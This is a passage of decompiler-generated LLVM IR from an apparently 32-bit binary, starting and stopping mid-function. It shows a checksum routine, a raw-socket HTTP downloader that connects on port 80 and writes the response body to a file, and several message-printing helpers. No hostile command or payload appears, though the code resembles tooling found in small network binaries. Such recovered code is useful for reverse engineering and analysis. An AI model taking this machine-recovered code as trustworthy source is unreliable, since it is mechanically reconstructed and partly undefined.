  %stack_var_-28.0.lcssa17 = phi i16* [ %v5_10000e80, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ], [ %arg1, %dec_label_pc_10000e9c ]
  %stack_var_-32.0.lcssa16 = phi i32 [ %v2_10000e70, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ], [ 0, %dec_label_pc_10000e9c ]
  %v1_10000eb0 = bitcast i16* %stack_var_-28.0.lcssa17 to i8*
  %v2_10000eb0 = load i8, i8* %v1_10000eb0, align 1
  %v3_10000eb0 = zext i8 %v2_10000eb0 to i32
  %v2_10000ec8 = add i32 %v3_10000eb0, %stack_var_-32.0.lcssa16
  br label %dec_label_pc_10000ed0

dec_label_pc_10000ed0:                            ; preds = %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge, %dec_label_pc_10000e9c, %dec_label_pc_10000ea8
  %stack_var_-32.1 = phi i32 [ %v2_10000ec8, %dec_label_pc_10000ea8 ], [ 0, %dec_label_pc_10000e9c ], [ %v2_10000e70, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ]
  %v4_10000ed4 = sdiv i32 %stack_var_-32.1, 65536
  %v1_10000edc = urem i32 %stack_var_-32.1, 65536
  %v2_10000ee0 = add nsw i32 %v4_10000ed4, %v1_10000edc
  %v4_10000eec = sdiv i32 %v2_10000ee0, 65536
  %v2_10000ef4 = add nsw i32 %v4_10000eec, %v2_10000ee0
  %v2_10000f0018 = urem i32 %v2_10000ef4, 65536
  %v1_10000f0c = xor i32 %v2_10000f0018, 65535
  ret i32 %v1_10000f0c

; uselistorder directives
  uselistorder i32 %v2_10000ee0, { 1, 0 }
  uselistorder i32 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %v1_10000e88, { 0, 2, 1 }
  uselistorder i32 %v2_10000e70, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10000ed0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10000ea8, { 1, 0 }
  uselistorder label %dec_label_pc_10000e60, { 1, 0 }
}

define i32 @function_10000f30(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10000f30:
  %r11.global-to-local = alloca i32, align 4
  %stack_var_-4140 = alloca i32, align 4
  %stack_var_-5176 = alloca i32, align 4
  %stack_var_-5180 = alloca i32, align 4
  %stack_var_-5224 = alloca i32, align 4
  %stack_var_-5164 = alloca i32, align 4
  %stack_var_-5232 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10000f30 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10000f30, i32* %stack_var_-5232, align 4
  %v1_10000f5c = call i32 @function_100004f0(i32 %arg2)
  %v3_10000f64 = icmp eq i32 %v1_10000f5c, 0
  br i1 %v3_10000f64, label %dec_label_pc_10000f6c, label %dec_label_pc_10001504

dec_label_pc_10000f6c:                            ; preds = %dec_label_pc_10000f30
  %v2_10000f70 = icmp sgt i32 %arg3, 1
  br i1 %v2_10000f70, label %dec_label_pc_10000f98, label %dec_label_pc_10000f78

dec_label_pc_10000f78:                            ; preds = %dec_label_pc_10000f6c
  %v5_10000f8c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_1000d408.22 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10000f94 = call i32 @function_10008dd8()
  br label %dec_label_pc_10000f98

dec_label_pc_10000f98:                            ; preds = %dec_label_pc_10000f6c, %dec_label_pc_10000f78
  store i32 268439464, i32* @lr, align 4
  %v3_10000fa4 = call i32 @function_1000806c(i32 2, i32 1, i32 0)
  %v4_10000fb8 = icmp eq i32 %v3_10000fa4, -1
  br i1 %v4_10000fb8, label %dec_label_pc_10000fc0, label %dec_label_pc_10000fe0

dec_label_pc_10000fc0:                            ; preds = %dec_label_pc_10000f98
  %v5_10000fd4 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1000d42c.25 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10000fdc = call i32 @function_10008dd8()
  br label %dec_label_pc_10000fe0

dec_label_pc_10000fe0:                            ; preds = %dec_label_pc_10000f98, %dec_label_pc_10000fc0
  %v1_10000fe4 = add i32 %arg4, 4
  %v1_10000fe8 = inttoptr i32 %v1_10000fe4 to i32*
  %v2_10000fe8 = load i32, i32* %v1_10000fe8, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1000d454.27 to i32), i32* @r4, align 4
  %v5_10000ffc = inttoptr i32 %v2_10000fe8 to i8*
  %v6_10000ffc = call i32 @function_1000732c(i8* %v5_10000ffc, i32 ptrtoint ([8 x i8]* @global_var_1000d454.27 to i32), i32 7, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10001004 = icmp eq i32 %v6_10000ffc, 0
  %v2_10001014 = load i32, i32* %v1_10000fe8, align 4
  br i1 %v3_10001004, label %dec_label_pc_1000100c, label %dec_label_pc_10001030

dec_label_pc_1000100c:                            ; preds = %dec_label_pc_10000fe0
  %v1_10001018 = add i32 %v2_10001014, 7
  %v2_1000101c = ptrtoint i32* %stack_var_-5164 to i32
  %v2_10001028 = inttoptr i32 %v1_10001018 to i8*
  %v3_10001028 = call i32 @function_10007268(i32 %v2_1000101c, i8* %v2_10001028)
  br label %dec_label_pc_1000104c

dec_label_pc_10001030:                            ; preds = %dec_label_pc_10000fe0
  %v2_1000103c = ptrtoint i32* %stack_var_-5164 to i32
  %v2_10001048 = inttoptr i32 %v2_10001014 to i8*
  %v3_10001048 = call i32 @function_10007268(i32 %v2_1000103c, i8* %v2_10001048)
  br label %dec_label_pc_1000104c

dec_label_pc_1000104c:                            ; preds = %dec_label_pc_1000100c, %dec_label_pc_10001030
  %v2_10001068.pre-phi = phi i32 [ %v2_1000101c, %dec_label_pc_1000100c ], [ %v2_1000103c, %dec_label_pc_10001030 ]
  %v2_10001084 = ptrtoint i32* %stack_var_-5224 to i32
  store i32 %v2_10001068.pre-phi, i32* @r3, align 4
  %v0_1000107065 = call i32 @function_10007288()
  %v2_1000107867 = icmp eq i32 %v0_1000107065, 0
  br i1 %v2_1000107867, label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge, label %dec_label_pc_10001080

dec_label_pc_10001058:                            ; preds = %dec_label_pc_10001080
  %v1_1000105c = add i32 %storemerge570, 1
  store i32 %v2_10001068.pre-phi, i32* @r3, align 4
  %v0_10001070 = call i32 @function_10007288()
  %v2_10001078 = icmp ult i32 %v1_1000105c, %v0_10001070
  br i1 %v2_10001078, label %dec_label_pc_10001080, label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge

dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge: ; preds = %dec_label_pc_1000104c, %dec_label_pc_10001058
  %storemerge5.lcssa = phi i32 [ 0, %dec_label_pc_1000104c ], [ %v1_1000105c, %dec_label_pc_10001058 ]
  %.pre29 = add i32 %storemerge5.lcssa, %v2_10001084
  %.pre30 = add i32 %.pre29, 60
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_1000109c

dec_label_pc_10001080:                            ; preds = %dec_label_pc_1000104c, %dec_label_pc_10001058
  %storemerge570 = phi i32 [ %v1_1000105c, %dec_label_pc_10001058 ], [ 0, %dec_label_pc_1000104c ]
  %v2_10001088 = add i32 %storemerge570, %v2_10001084
  %v1_1000108c = add i32 %v2_10001088, 60
  %v2_1000108c = inttoptr i32 %v1_1000108c to i8*
  %v3_1000108c = load i8, i8* %v2_1000108c, align 1
  %v3_10001094 = icmp eq i8 %v3_1000108c, 47
  br i1 %v3_10001094, label %dec_label_pc_1000109c, label %dec_label_pc_10001058

dec_label_pc_1000109c:                            ; preds = %dec_label_pc_10001080, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge
  %storemerge564 = phi i32 [ %storemerge5.lcssa, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge ], [ %storemerge570, %dec_label_pc_10001080 ]
  %v4_100010ac.pre-phi = phi i8* [ %.pre31, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge ], [ %v2_1000108c, %dec_label_pc_10001080 ]
  store i8 0, i8* %v4_100010ac.pre-phi, align 1
  store i32 2, i32* %stack_var_-5180, align 4
  store i32 80, i32* @r3, align 4
  %v1_100010bc = call i32 @function_100079f4(i32 80)
  store i32 268439764, i32* @lr, align 4
  %v1_100010d0 = call i32 @function_10007b20(i32 %v2_10001068.pre-phi)
  %v4_100010e4 = icmp eq i32 %v1_100010d0, -1
  br i1 %v4_100010e4, label %dec_label_pc_100010ec, label %dec_label_pc_10001160

dec_label_pc_100010ec:                            ; preds = %dec_label_pc_1000109c
  store i32 268439800, i32* @lr, align 4
  %v2_100010f4 = call i32 @function_10007b54(i32 %v2_10001068.pre-phi, i32 -1)
  %v3_10001104 = icmp eq i32 %v2_100010f4, 0
  br i1 %v3_10001104, label %dec_label_pc_1000110c, label %dec_label_pc_1000112c

dec_label_pc_1000110c:                            ; preds = %dec_label_pc_100010ec
  %v5_10001120 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000d45c.30 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10001128 = call i32 @function_10008dd8()
  br label %dec_label_pc_1000112c

dec_label_pc_1000112c:                            ; preds = %dec_label_pc_100010ec, %dec_label_pc_1000110c
  %v2_10001130 = ptrtoint i32* %stack_var_-5176 to i32
  %v1_10001138 = add i32 %v2_100010f4, 16
  %v2_10001138 = inttoptr i32 %v1_10001138 to i32*
  %v3_10001138 = load i32, i32* %v2_10001138, align 4
  %v1_1000113c = inttoptr i32 %v3_10001138 to i32*
  %v2_1000113c = load i32, i32* %v1_1000113c, align 4
  store i32 %v2_1000113c, i32* %r11.global-to-local, align 4
  %v1_10001144 = add i32 %v2_100010f4, 12
  %v2_10001144 = inttoptr i32 %v1_10001144 to i32*
  %v3_10001144 = load i32, i32* %v2_10001144, align 4
  store i32 %v2_10001130, i32* @r3, align 4
  store i32 %v2_1000113c, i32* @r4, align 4
  store i32 %v3_10001144, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000115c.33 to i32), i32* @lr, align 4
  %v0_10001158 = call i32 @function_10007108()
  br label %dec_label_pc_10001168

dec_label_pc_10001160:                            ; preds = %dec_label_pc_1000109c
  store i32 %v1_100010d0, i32* %stack_var_-5176, align 4
  br label %dec_label_pc_10001168

dec_label_pc_10001168:                            ; preds = %dec_label_pc_1000112c, %dec_label_pc_10001160
  %v2_10001180.pre-phi = ptrtoint i32* %stack_var_-5180 to i32
  store i32 268439956, i32* @lr, align 4
  %v3_10001190 = call i32 @function_10007f54(i32 %v3_10000fa4, i32 %v2_10001180.pre-phi, i32 16)
  %v3_10001198 = icmp eq i32 %v3_10001190, 0
  br i1 %v3_10001198, label %dec_label_pc_100011c0, label %dec_label_pc_100011a0

dec_label_pc_100011a0:                            ; preds = %dec_label_pc_10001168
  %v5_100011b4 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000d484.34 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_100011bc = call i32 @function_10008dd8()
  br label %dec_label_pc_100011c0

dec_label_pc_100011c0:                            ; preds = %dec_label_pc_10001168, %dec_label_pc_100011a0
  %v2_100011c8 = add i32 %v2_10001068.pre-phi, 1
  %v1_100011cc = add i32 %v2_100011c8, %storemerge564
  store i32 %v2_10001068.pre-phi, i32* %r11.global-to-local, align 4
  %v6_100011ec = call i32 @function_1000041c(i32 %v3_10000fa4, i32 ptrtoint ([276 x i8]* @global_var_1000d4ac.36 to i32), i32 %v1_100011cc, i32 %v2_10001068.pre-phi)
  %v5_10001204 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_1000d5c0.37 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v1_1000120c = add i32 %arg4, 8
  %v1_10001210 = inttoptr i32 %v1_1000120c to i32*
  %v2_10001210 = load i32, i32* %v1_10001210, align 4
  store i32 268440100, i32* @lr, align 4
  %v3_10001220 = call i32 @function_10004f90(i32 %v2_10001210, i32 ptrtoint ([3 x i8]* @global_var_1000d5dc.38 to i32))
  %v2_1000122c = ptrtoint i32* %stack_var_-4140 to i32
  br label %dec_label_pc_1000122c

dec_label_pc_1000122c:                            ; preds = %dec_label_pc_10001388, %dec_label_pc_100011c0
  store i32 268440132, i32* @lr, align 4
  %v4_10001240 = call i32 @function_10007fb8(i32 %v3_10000fa4, i32 %v2_1000122c, i32 4096, i32 0)
  %tmp58 = icmp slt i32 %v4_10001240, 1
  br i1 %tmp58, label %dec_label_pc_100013a8, label %dec_label_pc_10001258

dec_label_pc_10001258:                            ; preds = %dec_label_pc_1000122c
  %v2_1000125c = icmp sgt i32 %v4_10001240, 4095
  br i1 %v2_1000125c, label %dec_label_pc_10001284.lr.ph, label %dec_label_pc_10001264

dec_label_pc_10001264:                            ; preds = %dec_label_pc_10001258
  %v2_1000126c = add i32 %v4_10001240, %v2_10001084
  %v3_10001274 = add i32 %v2_1000126c, 1084
  %v4_10001274 = inttoptr i32 %v3_10001274 to i8*
  store i8 0, i8* %v4_10001274, align 1
  br label %dec_label_pc_10001284.lr.ph

dec_label_pc_10001284.lr.ph:                      ; preds = %dec_label_pc_10001264, %dec_label_pc_10001258
  br label %dec_label_pc_10001284

dec_label_pc_10001284:                            ; preds = %dec_label_pc_10001284.lr.ph, %dec_label_pc_10001388
  %storemerge625 = phi i32 [ 0, %dec_label_pc_10001284.lr.ph ], [ %v1_1000138c, %dec_label_pc_10001388 ]
  %v2_10001290 = add i32 %storemerge625, %v2_1000122c
  store i32 ptrtoint ([5 x i8]* @global_var_1000d5e0.39 to i32), i32* @r4, align 4
  %v5_100012a4 = inttoptr i32 %v2_10001290 to i8*
  %v6_100012a4 = call i32 @function_1000732c(i8* %v5_100012a4, i32 ptrtoint ([5 x i8]* @global_var_1000d5e0.39 to i32), i32 4, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100012ac = icmp eq i32 %v6_100012a4, 0
  br i1 %v3_100012ac, label %dec_label_pc_100012b4, label %dec_label_pc_10001388

dec_label_pc_100012b4:                            ; preds = %dec_label_pc_10001284
  %v1_100012b8 = add i32 %storemerge625, 4
  %v2_1000137c18 = icmp slt i32 %v1_100012b8, %v4_10001240
  br i1 %v2_1000137c18, label %dec_label_pc_100012c4.lr.ph, label %dec_label_pc_100013a8

dec_label_pc_100012c4.lr.ph:                      ; preds = %dec_label_pc_100012b4
  %v1_100012d0 = add i32 %v3_10001220, 52
  %v2_100012d0 = inttoptr i32 %v1_100012d0 to i32*
  %v1_100012e0 = add i32 %v3_10001220, 16
  %v2_100012e0 = inttoptr i32 %v1_100012e0 to i32*
  %v1_100012e8 = add i32 %v3_10001220, 28
  %v2_100012e8 = inttoptr i32 %v1_100012e8 to i32*
  br label %dec_label_pc_100012c4

dec_label_pc_100012c4:                            ; preds = %dec_label_pc_100012c4.lr.ph, %dec_label_pc_10001368
  %storemerge721 = phi i32 [ %v1_100012b8, %dec_label_pc_100012c4.lr.ph ], [ %v1_1000136c, %dec_label_pc_10001368 ]
  %v3_100012d0 = load i32, i32* %v2_100012d0, align 4
  %v3_100012d4 = icmp eq i32 %v3_100012d0, 0
  br i1 %v3_100012d4, label %dec_label_pc_10001348, label %dec_label_pc_100012dc

dec_label_pc_100012dc:                            ; preds = %dec_label_pc_100012c4
  %v3_100012e0 = load i32, i32* %v2_100012e0, align 4
  store i32 %v3_100012e0, i32* %r11.global-to-local, align 4
  %v3_100012e8 = load i32, i32* %v2_100012e8, align 4
  %v2_100012ec = icmp ult i32 %v3_100012e0, %v3_100012e8
  br i1 %v2_100012ec, label %dec_label_pc_100012f4, label %dec_label_pc_10001324

dec_label_pc_100012f4:                            ; preds = %dec_label_pc_100012dc
  %v3_100012f8 = load i32, i32* %v2_100012e0, align 4
  store i32 %v3_100012f8, i32* %r11.global-to-local, align 4
  %v2_10001304 = add i32 %storemerge721, %v2_10001084
  %v1_10001308 = add i32 %v2_10001304, 1084
  %v2_10001308 = inttoptr i32 %v1_10001308 to i8*
  %v3_10001308 = load i8, i8* %v2_10001308, align 1
  %v3_10001310 = inttoptr i32 %v3_100012f8 to i8*
  store i8 %v3_10001308, i8* %v3_10001310, align 1
  %v0_10001314 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001314 = add i32 %v0_10001314, 1
  store i32 %v1_10001314, i32* %v2_100012e0, align 4
  br label %dec_label_pc_10001368

dec_label_pc_10001324:                            ; preds = %dec_label_pc_100012dc
  %v2_1000132c = add i32 %storemerge721, %v2_10001084
  %v1_10001330 = add i32 %v2_1000132c, 1084
  %v2_10001330 = inttoptr i32 %v1_10001330 to i8*
  %v3_10001330 = load i8, i8* %v2_10001330, align 1
  store i32 ptrtoint (i32* @global_var_10001344.40 to i32), i32* @lr, align 4
  %v4_10001340 = call i32 @function_10006ed0(i8 %v3_10001330, i32 %v3_10001220, i32 %v2_1000132c)
  br label %dec_label_pc_10001368

dec_label_pc_10001348:                            ; preds = %dec_label_pc_100012c4
  %v2_10001350 = add i32 %storemerge721, %v2_10001084
  %v1_10001354 = add i32 %v2_10001350, 1084
  %v2_10001354 = inttoptr i32 %v1_10001354 to i8*
  %v3_10001354 = load i8, i8* %v2_10001354, align 1
  store i32 268440424, i32* @lr, align 4
  %v4_10001364 = call i32 @function_100069e4(i8 %v3_10001354, i32 %v3_10001220, i32 %v2_10001350)
  br label %dec_label_pc_10001368

dec_label_pc_10001368:                            ; preds = %dec_label_pc_10001324, %dec_label_pc_100012f4, %dec_label_pc_10001348
  %v1_1000136c = add i32 %storemerge721, 1
  %v2_1000137c = icmp slt i32 %v1_1000136c, %v4_10001240
  br i1 %v2_1000137c, label %dec_label_pc_100012c4, label %dec_label_pc_100013a8

dec_label_pc_10001388:                            ; preds = %dec_label_pc_10001284
  %v1_1000138c = add nuw nsw i32 %storemerge625, 1
  %v2_1000139c = icmp slt i32 %v1_1000138c, %v4_10001240
  br i1 %v2_1000139c, label %dec_label_pc_10001284, label %dec_label_pc_1000122c

dec_label_pc_100013a8:                            ; preds = %dec_label_pc_1000122c, %dec_label_pc_10001368, %dec_label_pc_100012b4
  %v2_100013b0 = load i32, i32* %v1_10001210, align 4
  %v6_100013cc = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1000d5e8.41 to i32), i32 %arg2, i32 %v2_100013b0)
  %v1_10001434 = add i32 %v3_10001220, 52
  %v2_10001434 = inttoptr i32 %v1_10001434 to i32*
  %v1_10001444 = add i32 %v3_10001220, 16
  %v2_10001444 = inttoptr i32 %v1_10001444 to i32*
  %v1_1000144c = add i32 %v3_10001220, 28
  %v2_1000144c = inttoptr i32 %v1_1000144c to i32*
  br label %dec_label_pc_100013d0

dec_label_pc_100013d0:                            ; preds = %dec_label_pc_100014cc, %dec_label_pc_100013a8
  store i32 268440552, i32* @lr, align 4
  %v4_100013e4 = call i32 @function_10007fb8(i32 %v3_10000fa4, i32 %v2_1000122c, i32 4096, i32 0)
  %tmp59 = icmp slt i32 %v4_100013e4, 1
  br i1 %tmp59, label %dec_label_pc_100014ec, label %dec_label_pc_100013fc

dec_label_pc_100013fc:                            ; preds = %dec_label_pc_100013d0
  %v2_10001400 = icmp sgt i32 %v4_100013e4, 4095
  br i1 %v2_10001400, label %dec_label_pc_10001428.lr.ph, label %dec_label_pc_10001408

dec_label_pc_10001408:                            ; preds = %dec_label_pc_100013fc
  %v2_10001410 = add i32 %v4_100013e4, %v2_10001084
  %v3_10001418 = add i32 %v2_10001410, 1084
  %v4_10001418 = inttoptr i32 %v3_10001418 to i8*
  store i8 0, i8* %v4_10001418, align 1
  br label %dec_label_pc_10001428.lr.ph

dec_label_pc_10001428.lr.ph:                      ; preds = %dec_label_pc_10001408, %dec_label_pc_100013fc
  br label %dec_label_pc_10001428

dec_label_pc_10001428:                            ; preds = %dec_label_pc_10001428.lr.ph, %dec_label_pc_100014cc
  %storemerge817 = phi i32 [ 0, %dec_label_pc_10001428.lr.ph ], [ %v1_100014d0, %dec_label_pc_100014cc ]
  store i32 %v3_10001220, i32* %stack_var_-5224, align 4
  %v3_10001434 = load i32, i32* %v2_10001434, align 4
  %v3_10001438 = icmp eq i32 %v3_10001434, 0
  br i1 %v3_10001438, label %dec_label_pc_100014ac, label %dec_label_pc_10001440

dec_label_pc_10001440:                            ; preds = %dec_label_pc_10001428
  %v3_10001444 = load i32, i32* %v2_10001444, align 4
  store i32 %v3_10001444, i32* %r11.global-to-local, align 4
  %v3_1000144c = load i32, i32* %v2_1000144c, align 4
  %v2_10001450 = icmp ult i32 %v3_10001444, %v3_1000144c
  br i1 %v2_10001450, label %dec_label_pc_10001458, label %dec_label_pc_10001488

dec_label_pc_10001458:                            ; preds = %dec_label_pc_10001440
  %v3_1000145c = load i32, i32* %v2_10001444, align 4
  store i32 %v3_1000145c, i32* %r11.global-to-local, align 4
  %v2_10001468 = add i32 %storemerge817, %v2_10001084
  %v1_1000146c = add i32 %v2_10001468, 1084
  %v2_1000146c = inttoptr i32 %v1_1000146c to i8*
  %v3_1000146c = load i8, i8* %v2_1000146c, align 1
  %v3_10001474 = inttoptr i32 %v3_1000145c to i8*
  store i8 %v3_1000146c, i8* %v3_10001474, align 1
  %v0_10001478 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001478 = add i32 %v0_10001478, 1
  %v3_1000147c = load i32, i32* %stack_var_-5224, align 4
  %v2_10001480 = add i32 %v3_1000147c, 16
  %v3_10001480 = inttoptr i32 %v2_10001480 to i32*
  store i32 %v1_10001478, i32* %v3_10001480, align 4
  br label %dec_label_pc_100014cc

dec_label_pc_10001488:                            ; preds = %dec_label_pc_10001440
  %v2_10001490 = add i32 %storemerge817, %v2_10001084
  %v1_10001494 = add i32 %v2_10001490, 1084
  %v2_10001494 = inttoptr i32 %v1_10001494 to i8*
  %v3_10001494 = load i8, i8* %v2_10001494, align 1
  store i32 ptrtoint (i32* @global_var_100014a8.42 to i32), i32* @lr, align 4
  %v4_100014a4 = call i32 @function_10006ed0(i8 %v3_10001494, i32 %v3_10001220, i32 %v2_10001490)
  br label %dec_label_pc_100014cc

dec_label_pc_100014ac:                            ; preds = %dec_label_pc_10001428
  %v2_100014b4 = add i32 %storemerge817, %v2_10001084
  %v1_100014b8 = add i32 %v2_100014b4, 1084
  %v2_100014b8 = inttoptr i32 %v1_100014b8 to i8*
  %v3_100014b8 = load i8, i8* %v2_100014b8, align 1
  store i32 268440780, i32* @lr, align 4
  %v4_100014c8 = call i32 @function_100069e4(i8 %v3_100014b8, i32 %v3_10001220, i32 %v2_100014b4)
  br label %dec_label_pc_100014cc

dec_label_pc_100014cc:                            ; preds = %dec_label_pc_10001488, %dec_label_pc_10001458, %dec_label_pc_100014ac
  %v1_100014d0 = add nuw nsw i32 %storemerge817, 1
  %v2_100014e0 = icmp slt i32 %v1_100014d0, %v4_100013e4
  br i1 %v2_100014e0, label %dec_label_pc_10001428, label %dec_label_pc_100013d0

dec_label_pc_100014ec:                            ; preds = %dec_label_pc_100013d0
  store i32 268440820, i32* @lr, align 4
  %v1_100014f0 = inttoptr i32 %v3_10001220 to i16*
  %v2_100014f0 = call i32 @function_10004e44(i16* %v1_100014f0)
  store i32 ptrtoint ([3 x i8]* @global_var_100014fc.43 to i32), i32* @lr, align 4
  %v1_100014f8 = call i32 @function_10004ab4(i32 %v3_10000fa4)
  %v0_10001500 = call i32 @function_10008dd8()
  br label %dec_label_pc_10001504

dec_label_pc_10001504:                            ; preds = %dec_label_pc_10000f30, %dec_label_pc_100014ec
  %v0_1000151c = phi i32 [ %v1_10000f5c, %dec_label_pc_10000f30 ], [ %v0_10001500, %dec_label_pc_100014ec ]
  %v2_10001504 = load i32, i32* %stack_var_-5232, align 4
  store i32 %v2_10001504, i32* %r11.global-to-local, align 4
  ret i32 %v0_1000151c

; uselistorder directives
  uselistorder i32 %storemerge817, { 3, 0, 1, 2 }
  uselistorder i32 %v4_100013e4, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge721, { 3, 0, 1, 2 }
  uselistorder i32 %storemerge625, { 2, 0, 1 }
  uselistorder i32 %v4_10001240, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_1000122c, { 1, 0, 2 }
  uselistorder i32 %v3_10001220, { 11, 0, 1, 9, 3, 2, 10, 7, 4, 6, 5, 8 }
  uselistorder i32 %storemerge570, { 0, 2, 1 }
  uselistorder i32 %storemerge5.lcssa, { 1, 0 }
  uselistorder i32 %v1_1000105c, { 2, 1, 0 }
  uselistorder i32 %v2_10001068.pre-phi, { 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_10001504, { 1, 0 }
  uselistorder label %dec_label_pc_100014cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001428, { 1, 0 }
  uselistorder label %dec_label_pc_100013a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001368, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100012c4, { 1, 0 }
  uselistorder label %dec_label_pc_10001284, { 1, 0 }
  uselistorder label %dec_label_pc_100011c0, { 1, 0 }
  uselistorder label %dec_label_pc_10001168, { 1, 0 }
  uselistorder label %dec_label_pc_1000112c, { 1, 0 }
  uselistorder label %dec_label_pc_10001080, { 1, 0 }
  uselistorder label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000104c, { 1, 0 }
  uselistorder label %dec_label_pc_10000fe0, { 1, 0 }
  uselistorder label %dec_label_pc_10000f98, { 1, 0 }
}

define i32 @function_10001520(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001520:
  %tmp36 = call i8 @__decompiler_undefined_function_2()
  %v3_10001560 = load i32, i32* @global_var_10010464.16, align 4
  %v3_10001580 = icmp eq i32 %v3_10001560, 1
  %v3_1000159016 = zext i8 %tmp36 to i32
  br i1 %v3_10001580, label %dec_label_pc_10001588, label %dec_label_pc_100015f8

dec_label_pc_10001588:                            ; preds = %dec_label_pc_10001520
  %v9_100015f0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1000d600.44 to i32), i32 %arg2, i32 %v3_1000159016)
  br label %dec_label_pc_100016c0

dec_label_pc_100015f8:                            ; preds = %dec_label_pc_10001520
  %v9_100016bc = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_1000d620.46 to i32), i32 %arg2, i32 %v3_1000159016)
  br label %dec_label_pc_100016c0

dec_label_pc_100016c0:                            ; preds = %dec_label_pc_10001588, %dec_label_pc_100015f8
  %storemerge = phi i32 [ %v9_100016bc, %dec_label_pc_100015f8 ], [ %v9_100015f0, %dec_label_pc_10001588 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_1000159016, { 1, 0 }
  uselistorder label %dec_label_pc_100016c0, { 1, 0 }
}

define i32 @function_100016e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100016e4:
  %v5_1000171c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1000d650.47 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v5_1000171c
}

define i32 @function_10001738(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001738:
  %v3_10001760 = icmp eq i32 %arg3, 1
  br i1 %v3_10001760, label %dec_label_pc_10001784, label %dec_label_pc_10001768

dec_label_pc_10001768:                            ; preds = %dec_label_pc_10001738
  %v5_1000177c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1000d670.48 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_100017e4

dec_label_pc_10001784:                            ; preds = %dec_label_pc_10001738
  %v1_10001788 = add i32 %arg4, 4
  %v1_1000178c = inttoptr i32 %v1_10001788 to i32*
  %v2_1000178c = load i32, i32* %v1_1000178c, align 4
  store i32 %v2_1000178c, i32* @r3, align 4
  %v0_10001794 = call i32 @function_10007288()
  %tmp9 = icmp ult i32 %v0_10001794, 10
  br i1 %tmp9, label %dec_label_pc_100017c0, label %dec_label_pc_100017a4

dec_label_pc_100017a4:                            ; preds = %dec_label_pc_10001784
  %v5_100017b8 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_1000d688.50 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_100017e4

dec_label_pc_100017c0:                            ; preds = %dec_label_pc_10001784
  %v2_100017c8 = load i32, i32* %v1_1000178c, align 4
  %v5_100017e0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1000d6c0.52 to i32), i32 %v2_100017c8, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_100017e4

dec_label_pc_100017e4:                            ; preds = %dec_label_pc_100017a4, %dec_label_pc_10001768, %dec_label_pc_100017c0
